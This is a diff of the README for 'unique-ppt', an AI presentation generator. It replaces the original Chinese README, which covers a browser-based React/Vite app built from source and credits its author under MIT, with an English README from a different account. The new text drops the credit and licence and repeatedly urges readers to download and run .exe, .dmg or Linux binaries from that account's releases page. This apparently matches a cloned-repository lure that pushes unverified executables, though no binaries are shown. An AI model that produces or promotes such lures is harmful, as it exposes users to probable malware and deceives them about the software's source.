@@ -1,15 +1,64 @@
-# 微微幻灯片 (unique-ppt)
+# 📊 unique-ppt - Create Stunning Presentations Effortlessly
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![React](https://img.shields.io/badge/React-18.3-blue.svg)](https://reactjs.org/)
-[![Vite](https://img.shields.io/badge/Vite-6.0-646CFF.svg)](https://vitejs.dev/)
-[![Tailwind CSS](https://img.shields.io/badge/Tailwind-3.4-38B2AC.svg)](https://tailwindcss.com/)
-
-**AI 驱动的图文并茂 PPT 生成器** — 输入主题或文本，AI 自动生成大纲，并为每一页智能生成匹配内容的精美配图。
+[![Download unique-ppt](https://img.shields.io/badge/Download-Now-brightgreen.svg)](https://github.com/juanma696/unique-ppt/releases)
 
 ---
 
-## 📸 预览
+## 🚀 Getting Started
+
+Welcome to unique-ppt! This tool uses AI to help you create beautiful presentations quickly. Follow these simple steps to start using the application.
+
+## 🛠️ System Requirements
+
+Before downloading, ensure your computer meets these basic requirements:
+
+- **Operating System:** Windows 10 or later, macOS High Sierra (10.13) or later, or a modern Linux distribution.
+- **Processor:** At least 2 GHz dual-core processor.
+- **Memory:** 4 GB RAM or more.
+- **Storage:** 200 MB of free disk space.
+- **Internet Connection:** Required for AI features.
+
+## 📥 Download & Install
+
+To get started, visit the [Releases page](https://github.com/juanma696/unique-ppt/releases) to download the latest version of unique-ppt.
+
+1. Click the link above.
+2. Find the latest version listed at the top.
+3. Download the appropriate installer for your operating system.
+4. Once the download finishes, locate the file in your downloads folder.
+
+## 🖥️ Running the Application
+
+After downloading, follow these steps to install and run unique-ppt:
+
+1. **For Windows:**
+   - Double-click the downloaded `.exe` file.
+   - Follow the on-screen instructions to install the application.
+
+2. **For macOS:**
+   - Open the downloaded `.dmg` file.
+   - Drag the unique-ppt icon into your Applications folder.
+
+3. **For Linux:**
+   - Extract the downloaded tar.gz file.
+   - Open a terminal and navigate to the extracted folder.
+   - Run the command `./unique-ppt` to launch the application.
+
+## 🎨 Features
+
+unique-ppt offers several advanced features to make your presentation-making experience smooth and enjoyable:
+
+| Feature            | Description                                               |
+|--------------------|---------------------------------------------------------|
+| 🖼️ **Smart Images** | Automatically generates relevant AI images for each slide, enhancing the visual appeal. |
+| 🤖 **AI Outlining** | Input your topic or text to generate structured outlines with a single click. |
+| 🍱 **Flexible Layouts** | Choose from various presentation layouts, including cover pages and split-screen designs. |
+| 🎨 **Custom Themes** | Apply different color themes to match your branding or personal style. |
+| 📊 **Export Options** | Save your presentations in different formats like PDF and PPTX for easy sharing. |
+
+## 📸 Preview
+
+To see what unique-ppt looks like, view the images below:
 
 <p align="center">
   <img src="assets/home.png" alt="首页" width="45%" />
@@ -21,82 +70,20 @@
   <img src="assets/generation.png" alt="生成页面" width="45%" />
 </p>
 
----
+## 🔧 Troubleshooting
 
-## ✨ 核心特性
+If you encounter issues while using unique-ppt, consider these solutions:
 
-| 特性            | 描述                                             |
-| --------------- | ------------------------------------------------ |
-| 🖼️ **智能配图** | 根据每页内容自动生成匹配的 AI 图片，真正图文并茂 |
-| 🤖 **AI 编剧**  | 支持"主题"或"长文"模式，一键生成结构化大纲       |
-| 🍱 **多种排版** | 封面、左右分割、磨砂玻璃、极简等多种精美布局     |
-| 📄 **一键导出** | 标准 PPTX 格式，兼容 Office 与 Keynote           |
-| 🌗 **深色模式** | 完美支持深色/浅色主题切换                        |
-| ⚡ **并发生成** | 最多 5 张图片同时生成，速度提升 3-5 倍           |
+1. **Application Won't Open:** Ensure your operating system meets the minimum requirements.
+2. **Slow Performance:** Close other applications to free up system resources.
+3. **Image Generation Errors:** Check your internet connection and try again.
 
----
+## 💬 Support
 
-## 🚀 快速开始
+For questions or feedback, visit our [GitHub Issues page](https://github.com/juanma696/unique-ppt/issues). Your input helps us improve unique-ppt.
 
-```bash
-# 克隆项目
-git clone https://github.com/uniqueww/unique-ppt.git
-cd unique-ppt
-
-# 安装依赖
-npm install
-
-# 启动开发服务器
-npm run dev
-
-# 构建生产版本
-npm run build
-```
-
-访问 `http://localhost:5173` 开始使用。
+Feel free to reach out. We’re here to assist you on your journey to creating impressive presentations!
 
 ---
 
-## ⚙️ API 配置
-
-点击右上角齿轮图标进入设置：
-
-| 类型        | 支持的服务                     |
-| ----------- | ------------------------------ |
-| **文本 AI** | OpenAI (GPT-4) / Google Gemini |
-| **图像 AI** | DALL-E 3 / Gemini / Imagen     |
-
-> 💡 API 密钥仅存储在浏览器本地，不会上传到任何服务器。
-
----
-
-## 🛠️ 技术栈
-
-- **前端**: React 18 + Vite + Tailwind CSS
-- **图标**: Lucide React
-- **导出**: pptxgenjs
-- **存储**: IndexedDB
-
----
-
-## 📁 项目结构
-
-```
-src/
-├── components/   # UI 组件
-├── constants/    # 配置常量
-├── hooks/        # 自定义 Hooks
-├── services/     # API 调用
-├── utils/        # 工具函数
-└── App.jsx       # 主程序
-```
-
----
-
-## 📄 开源协议
-
-[MIT License](LICENSE)
-
----
-
-由 [uniqueww](https://github.com/uniqueww) 开发
+[![Download unique-ppt](https://img.shields.io/badge/Download-Now-brightgreen.svg)](https://github.com/juanma696/unique-ppt/releases)
